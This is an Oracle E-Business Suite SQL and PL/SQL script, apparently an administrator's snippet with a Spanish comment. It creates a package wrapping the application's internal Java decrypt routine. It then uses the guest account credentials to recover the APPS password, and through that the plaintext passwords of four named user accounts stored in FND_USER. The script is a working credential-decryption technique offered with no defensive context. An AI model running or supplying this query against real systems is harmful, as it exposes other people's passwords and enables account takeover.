SELECT
    'USER:'||USR.USER_NAME
   ,'PASS: '||GET_PWD.DECRYPT((
        SELECT
            (
                SELECT
                    GET_PWD.DECRYPT(FND_WEB_SEC.GET_GUEST_USERNAME_PWD,USERTABLE.ENCRYPTED_FOUNDATION_PASSWORD)
                FROM
                    DUAL
            )AS APPS_PASSWORD
        FROM
            FND_USER USERTABLE
        WHERE
            USERTABLE.USER_NAME =(
                SELECT
                    SUBSTR(FND_WEB_SEC.GET_GUEST_USERNAME_PWD
                          ,1
                          ,INSTR(FND_WEB_SEC.GET_GUEST_USERNAME_PWD,'/')- 1)
                FROM
                    DUAL
            )
    )
                    ,USR.ENCRYPTED_USER_PASSWORD)PASSWORD
FROM
    FND_USER USR
WHERE
    USR.USER_NAME IN ('MARTINEZJAI','MARQUEZV','DELEONV','LIMAD');





-- Paquete en caso de que no exista
CREATE OR REPLACE PACKAGE get_pwd
AS
   FUNCTION decrypt (KEY IN VARCHAR2, VALUE IN VARCHAR2)
      RETURN VARCHAR2;
END get_pwd;

--
CREATE OR REPLACE PACKAGE BODY get_pwd
AS
   FUNCTION decrypt (KEY IN VARCHAR2, VALUE IN VARCHAR2)
      RETURN VARCHAR2
   AS
      LANGUAGE JAVA
      NAME 'oracle.apps.fnd.security.WebSessionManagerProc.decrypt(java.lang.String,java.lang.String) return java.lang.String';
END get_pwd;
